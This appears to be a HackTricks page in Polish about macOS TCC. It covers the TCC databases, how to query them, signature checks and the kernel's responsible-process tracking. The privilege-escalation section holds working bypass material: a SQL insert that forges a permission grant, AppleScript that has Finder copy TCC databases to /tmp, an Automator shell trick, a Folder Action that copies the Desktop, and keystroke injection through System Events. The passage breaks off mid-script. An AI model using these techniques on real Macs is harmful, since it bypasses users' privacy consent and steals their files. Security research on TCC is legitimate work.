# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Podstawowe informacje**

**TCC (Transparency, Consent, and Control)** to protokół bezpieczeństwa regulujący uprawnienia aplikacji. Jego głównym zadaniem jest ochrona dostępu do wrażliwych funkcji, takich jak **usługi lokalizacyjne, kontakty, zdjęcia, mikrofon, kamera, dostępność i pełny dostęp do dysku**. Wymagając wyraźnej zgody użytkownika przed przyznaniem aplikacji dostępu do tych elementów, TCC zwiększa prywatność i kontrolę użytkownika nad jego danymi.

Użytkownicy spotykają się z TCC, gdy aplikacje proszą o dostęp do chronionych funkcji. Wyświetla się wtedy monit umożliwiający **przyznanie lub odmowę dostępu**. Ponadto TCC obsługuje bezpośrednie działania użytkownika, takie jak **przeciąganie i upuszczanie plików do aplikacji**, aby przyznać jej dostęp do określonych plików. Dzięki temu aplikacje mają dostęp tylko do tych zasobów, na które wyraźnie zezwolono.

![Przykład monitu TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** jest obsługiwany przez **daemon** znajdujący się w `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` i skonfigurowany w `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (rejestrujący usługę mach `com.apple.tccd.system`).

Dla każdego zalogowanego użytkownika działa osobny **tccd w trybie użytkownika**, zdefiniowany w `/System/Library/LaunchAgents/com.apple.tccd.plist`, który rejestruje usługi mach `com.apple.tccd` i `com.apple.usernotifications.delegate.com.apple.tccd`.

Poniżej widać tccd działający jako system oraz jako użytkownik:

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

Uprawnienia są **dziedziczone z aplikacji nadrzędnej**, a **uprawnienia** są **śledzone** na podstawie **Bundle ID** i **Developer ID**.

### Bazy danych TCC

Zezwolenia/odmowy są następnie przechowywane w bazach danych TCC:

- Ogólnosystemowa baza danych **`/Library/Application Support/com.apple.TCC/TCC.db`** .
  - Ta baza danych jest **chroniona przez SIP**, więc zapisywać w niej może tylko proces z obejściem SIP.
- Baza danych TCC użytkownika **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**, która przechowuje preferencje poszczególnych użytkowników.
  - Ta baza danych jest chroniona, więc zapisywać w niej mogą tylko procesy z wysokimi uprawnieniami TCC, takimi jak Full Disk Access (nie jest jednak chroniona przez SIP).

> [!WARNING]
> Poprzednie bazy danych są również **chronione przez TCC przed odczytem**. Dlatego **nie będziesz w stanie odczytać** swojej zwykłej bazy danych TCC użytkownika, chyba że robisz to z procesu uprzywilejowanego w TCC.
>
> Pamiętaj jednak, że proces z takimi wysokimi uprawnieniami (np. **FDA** lub **`kTCCServiceEndpointSecurityClient`**) będzie mógł zapisywać w bazie danych TCC użytkownika.

- Istnieje **trzecia** baza danych TCC w **`/var/db/locationd/clients.plist`**, która wskazuje klientów uprawnionych do **korzystania z usług lokalizacyjnych**.
- **`/Library/Application Support/com.apple.TCC/REG.db`** zawiera zarejestrowane ścieżki do baz danych TCC. Podstawiona baza użytkownika może zostać odrzucona, jeśli nie jest zarejestrowana; sama znajomość tej ścieżki nie zapewnia dostępu do żadnej z baz danych.<sup>[[6]](#references)</sup>
- **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`** zawiera decyzje zarządzane przez Privacy Preferences Policy Control (PPPC). Sprawdź ten plik, gdy aplikacja ma zarządzane zezwolenie, którego nie ma w zwykłych wierszach `access`.<sup>[[7]](#references)</sup>
- Chroniony przez SIP plik **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (możliwy do odczytania przez każdego) zawiera listę dozwolonych aplikacji wymagających wyjątku TCC.

> [!TIP]
> Baza danych TCC w **iOS** znajduje się w **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> **Interfejs Centrum powiadomień** może **wprowadzać zmiany w ogólnosystemowej bazie danych TCC**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
> Użytkownicy mogą jednak **resetować reguły** za pomocą narzędzia wiersza poleceń **`tccutil`**; nie ma ono udokumentowanej operacji odpytywania.<sup>[[4]](#references)</sup>

#### Odpytaj bazy danych

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> Sprawdzając obie bazy danych, możesz sprawdzić, na jakie uprawnienia aplikacja zezwoliła, jakich odmówiła lub których nie ma (aplikacja o nie poprosi).

- **`service`** to tekstowa reprezentacja uprawnienia TCC
- **`client`** to **bundle ID** lub **ścieżka do pliku binarnego** z uprawnieniami
- **`client_type`** określa, czy jest to Bundle Identifier (0), czy ścieżka bezwzględna (1)

<details>

<summary>Jak uruchomić, jeśli jest to ścieżka bezwzględna</summary>

Wystarczy wykonać **`launctl load you_bin.plist`**, używając pliku plist takiego jak:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- **`auth_value`** może przyjmować różne wartości: denied(0), unknown(1), allowed(2) lub limited(3).
- **`auth_reason`** może przyjmować następujące wartości: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Pole **csreq** wskazuje, jak zweryfikować plik binarny, który ma zostać uruchomiony, i przyznać mu uprawnienia TCC:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- Więcej informacji o **pozostałych polach** tabeli znajdziesz [**w tym wpisie na blogu**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Możesz też sprawdzić **przyznane już uprawnienia** aplikacjom w `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Użytkownicy mogą **resetować** reguły za pomocą **`tccutil`**, ale aby sprawdzić przyznane uprawnienia, muszą przeanalizować bazy danych.<sup>[[4]](#references)</sup>

#### Resetowanie uprawnień TCC

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### Identyfikowanie uprawnień nadawcy i celu Apple Events

Uprawnienie Automation to decyzja **nadawca-do-celu**, a nie zezwolenie na sterowanie każdą aplikacją. Mając dostęp do bazy danych użytkownika, wylicz dozwolone pary nadawca/cel, zanim spróbujesz wykonać opisane poniżej operacje z użyciem [Apple Events](macos-apple-events.md) lub Findera. `csreq` identyfikuje nadawcę, a `indirect_object_code_identity` — cel; zdekoduj każdy niepusty blob metodą `csreq` opisaną powyżej.<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### Kontrola podpisu TCC

Baza danych TCC **przechowuje** **identyfikator Bundle ID** aplikacji, ale również **przechowuje** **informacje** o **podpisie**, aby **upewnić się**, że aplikacja prosząca o uprawnienie jest właściwa.

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> Dlatego inne aplikacje używające tej samej nazwy i bundle ID nie będą mogły uzyskać dostępu do uprawnień przyznanych innym aplikacjom.

### Uprawnienia Entitlements i TCC

Przyznanie dostępu przez TCC nie znosi ograniczeń **App Sandbox**. Klient kamery działający w sandboxie potrzebuje uprawnienia `com.apple.security.device.camera`; Apple udostępnia tę możliwość również aplikacjom korzystającym z Hardened Runtime. Żadne z tych uprawnień nie omija osobnego monitu o zgodę użytkownika. Nie traktuj uprawnienia sandboxa jako bezwzględnego wymogu dla każdego procesu działającego poza sandboxem. Gdy żądanie dostępu się nie powiedzie, sprawdź uprawnienia pliku wykonywalnego oraz aplikację odpowiedzialną za żądanie.<sup>[[8]](#references)[[9]](#references)</sup>

Pamiętaj, że entitlements to pliki plist stanowiące część code sig. Są dodatkowo hashowane w code sig za pomocą specjalnych slotów. Mogą być odczytywane w kernelu przez kod kernela lub w trybie użytkownika za pomocą `csops(#169)` albo `csops_audittoken(#170)`.

Aby **uzyskać dostęp** do **niektórych folderów użytkownika**, takich jak `~/Desktop`, `~/Downloads` i `~/Documents`, aplikacje **nie potrzebują** żadnych konkretnych **entitlements**. System obsłuży dostęp w sposób przezroczysty i w razie potrzeby **wyświetli monit użytkownikowi**.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Aplikacje Apple **nie wyświetlają monitów**. Na liście **entitlements** mają **uprawnienia przyznane z góry**, co oznacza, że **nigdy nie wyświetlą wyskakującego okna** ani **nie pojawią się w żadnej z baz danych TCC**. Na przykład:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

Dzięki temu Calendar nie będzie pytać użytkownika o dostęp do przypomnień, kalendarza i książki adresowej.

> [!TIP]
> Oprócz oficjalnej dokumentacji dotyczącej uprawnień można znaleźć również nieoficjalne **ciekawe informacje o uprawnieniach na stronie** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Niektóre uprawnienia TCC to: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Nie ma publicznej listy, która definiowałaby je wszystkie, ale możesz sprawdzić tę [**listę znanych uprawnień**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Wrażliwe, niezabezpieczone lokalizacje

- $HOME (sam katalog)
- $HOME/.ssh, $HOME/.aws itd.
- /tmp

### Intencja użytkownika / com.apple.macl

Jak wspomniano wcześniej, można **przyznać aplikacji dostęp do pliku, przeciągając go i upuszczając na nią**. Dostęp ten nie zostanie zapisany w żadnej bazie danych TCC, lecz jako **atrybut rozszerzony pliku**. Atrybut ten będzie **przechowywać UUID** dozwolonej aplikacji:<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> Ciekawe, że atrybutem **`com.apple.macl`** zarządza **Sandbox**, a nie tccd.
>
> Zauważ też, że jeśli przeniesiesz plik, który przyznaje dostęp UUID aplikacji na Twoim komputerze, na inny komputer, dostęp nie zostanie przyznany tej aplikacji, ponieważ ta sama aplikacja będzie miała inne UID-y.

Atrybutu rozszerzonego `com.apple.macl` **nie można wyczyścić** tak jak innych atrybutów rozszerzonych, ponieważ jest **chroniony przez SIP**. Jednak, jak [**wyjaśniono w tym poście**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), można to obejść, **pakując plik do archiwum ZIP**, **usuwając** go, a następnie **rozpakowując** archiwum.<sup>[[3]](#references)</sup>






## Mechanizm odpowiedzialnego procesu XNU

W macOS/iOS mechanizm **odpowiedzialnego procesu** to kluczowa funkcja bezpieczeństwa używana przez framework **TCC (Transparency, Consent, and Control)** i inne systemy bezpieczeństwa do śledzenia, który proces ostatecznie odpowiada za daną czynność, nawet w łańcuchach procesów potomnych.

Gdy TCC sprawdza uprawnienia (np. do kamery, mikrofonu czy lokalizacji), nie zawsze sprawdza bezpośredni proces wysyłający żądanie. Zamiast tego sprawdza **odpowiedzialny proces** — zazwyczaj aplikację GUI, która zainicjowała daną czynność, nawet jeśli właściwe żądanie pochodzi z procesu pomocniczego lub demona.

Aby ustalić, której aplikacji faktycznie przypisano żądanie, podczas wykonywania chronionej operacji przechwytuj komunikaty `AttributionChain` TCC. Jest to bardziej wiarygodne niż przypisywanie uprawnienia do pliku wykonywalnego procesu pomocniczego tylko dlatego, że wykonał wywołanie API. Porównaj zgłoszoną tożsamość z identyfikatorem pakietu lub ścieżką oraz wymaganiem podpisu w odpowiednim wierszu `access`.<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>Jak ustawiany jest proces odpowiedzialny</summary>

### Pola struktury procesu

Każdy proces w XNU przechowuje dwa kluczowe identyfikatory UUID:

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**: UUID samego procesu (z polecenia ładowania `LC_UUID` w jego binarnym pliku Mach-O)
- **`p_responsible_pid`**: PID procesu odpowiedzialnego
- **`p_responsible_uuid`**: UUID procesu odpowiedzialnego (zachowuje się nawet po zakończeniu tego procesu)

### Jak ustalany jest proces odpowiedzialny

1. **Podczas tworzenia procesu (Fork)**

Gdy nowy proces jest tworzony za pomocą `fork()` lub `posix_spawn()`, dziedziczy proces odpowiedzialny po procesie nadrzędnym (wywołanie systemowe `exec()` ponownie wykorzystuje istniejącą strukturę `proc`, więc ten krok nie jest wtedy powtarzany):

**Lokalizacja**: `bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**Najważniejsze informacje:**
- Procesy potomne **dziedziczą** `p_responsible_pid` procesu nadrzędnego
- Tworzy to **łańcuch odpowiedzialności** w hierarchii procesów
- Proces odpowiedzialny zazwyczaj wskazuje pierwotną aplikację GUI

2. **Główna funkcja: `proc_set_responsible_pid()`**

**Lokalizacja**: `bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**Co robi ta funkcja:**
1. **Ustawia PID procesu odpowiedzialnego** w procesie docelowym
2. **Wyszukuje proces odpowiedzialny** za pomocą `proc_find()` (zwiększa licznik referencji)
3. **Kopiuje UUID** z `p_uuid` procesu odpowiedzialnego do `p_responsible_uuid` procesu docelowego
4. **Zwalnia referencję** za pomocą `proc_rele()` (zmniejsza licznik referencji)

3. **Dlaczego przechowywane są zarówno PID, jak i UUID?**

Podejście z podwójnym zapisem rozwiązuje istotny problem:

| Pole | Cel | Problem | Rozwiązanie |
|-------|-------|---------|----------|
| `p_responsible_pid` | Szybkie wyszukiwanie bieżącego procesu | PID może zostać ponownie użyty po zakończeniu procesu | Służy do wyszukiwania aktywnego procesu |
| `p_responsible_uuid` | Trwała identyfikacja | Zachowuje ważność po zakończeniu procesu | Służy do kontroli bezpieczeństwa i audytu |

**Problem**: Jeśli proces odpowiedzialny zakończy działanie przed procesem potomnym, jego PID może zostać ponownie przydzielony zupełnie innemu procesowi.

**Rozwiązanie**: UUID jest niezmienny i jednoznacznie identyfikuje konkretny plik binarny, który był odpowiedzialny, nawet po zakończeniu jego działania.

### Przepływ tworzenia procesu

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### Źródło UUID: polecenie ładowania LC_UUID

UUID przechowywany w `p_uuid` pochodzi z **polecenia ładowania `LC_UUID` pliku wykonywalnego Mach-O**:

1. **Czas kompilacji**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **Czas wykonania**

**Lokalizacja**: `bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **Przechowywane w strukturze procesu**

**Lokalizacja**: `bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**Lokalizacja**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc i obejścia

### Wstawianie do TCC

Jeśli w którymś momencie uda Ci się uzyskać dostęp do zapisu w bazie danych TCC, możesz użyć czegoś takiego, aby dodać wpis (usuń komentarze):

<details>

<summary>Przykład wstawiania do TCC</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### TCC Payloads

Jeśli udało Ci się uzyskać dostęp do aplikacji z pewnymi uprawnieniami TCC, sprawdź poniższą stronę z payloadami TCC, aby je wykorzystać:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Więcej informacji o Apple Events znajdziesz tutaj:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automatyzacja (Finder) do FDA\*

Nazwa uprawnienia Automatyzacji w TCC to: **`kTCCServiceAppleEvents`**\
To konkretne uprawnienie TCC wskazuje również **aplikację, którą można kontrolować** w bazie danych TCC (uprawnienie nie pozwala więc na kontrolowanie wszystkiego).

**Finder** to aplikacja, która **zawsze ma FDA** (nawet jeśli nie pojawia się w interfejsie), więc jeśli masz uprawnienia **Automatyzacji** dla tej aplikacji, możesz wykorzystać jej uprawnienia, aby **zlecić jej wykonanie pewnych działań**.\
W tym przypadku Twoja aplikacja potrzebowałaby uprawnienia **`kTCCServiceAppleEvents`** dla **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

Zgłoszony wariant zapisu, gdy dostępna jest ścieżka Automation do Findera, polega na tym, że Finder **zmienia nazwę katalogu użytkownika `com.apple.TCC`**. Bazę danych znajdującą się pod zmienioną ścieżką kopiowano następnie do katalogu stagingowego, modyfikowano ją tam, kopiowano z powrotem i przywracano pierwotną nazwę katalogu. Nowy wpis `kTCCServiceAppleEvents` musi identyfikować **zarówno wysyłający plik binarny, jak i Findera**, w tym ich wymagania dotyczące podpisu kodu; przyznanie uprawnień nadawcy bez określenia tożsamości celu nie jest równoważne. Ta technika zależy od ścieżki, więc sprawdź ją na docelowej wersji macOS, zamiast zakładać, że sama automatyzacja Findera umożliwia dowolny zapis do bazy danych.<sup>[[11]](#references)</sup>

> [!WARNING]
> Dzięki temu uprawnieniu będziesz w stanie **poprosić Findera o dostęp do folderów ograniczonych przez TCC** i uzyskać od niego pliki, ale o ile wiem, **nie będziesz w stanie skłonić Findera do wykonania dowolnego kodu**, aby w pełni wykorzystać jego dostęp FDA.
>
> Dlatego nie będziesz w stanie wykorzystać wszystkich możliwości FDA.

To jest monit TCC umożliwiający uzyskanie uprawnień Automation do Findera:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Pamiętaj, że ponieważ aplikacja **Automator** ma uprawnienie TCC **`kTCCServiceAppleEvents`**, może **sterować dowolną aplikacją**, na przykład Finderem. Mając więc uprawnienie do sterowania Automator, możesz również sterować **Finderem** za pomocą kodu takiego jak poniżej:

<details>

<summary>Uzyskaj shell wewnątrz Automator</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

To samo dzieje się w **aplikacji Script Editor**: może ona sterować Finderem, ale za pomocą AppleScript nie można zmusić jej do wykonania skryptu.

### Automatyzacja (SE) w przypadku niektórych TCC

**System Events może tworzyć Folder Actions, a Folder Actions mogą uzyskiwać dostęp do niektórych folderów TCC** (Biurko, Dokumenty i Pobrane), więc do nadużycia tego zachowania można użyć skryptu takiego jak poniższy:

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Automatyzacja (SE) + Dostępność (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**) do FDA\*

Automatyzacja w **`System Events`** + Dostępność (**`kTCCServicePostEvent`**) umożliwia wysyłanie **naciśnięć klawiszy do procesów**. W ten sposób można nadużyć Findera, aby zmodyfikować plik TCC.db użytkownika lub przyznać dowolnej aplikacji FDA (może jednak pojawić się monit o hasło).

Przykład nadpisania pliku TCC.db użytkownika przez Findera:

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
    set homePath to system attribute "HOME"

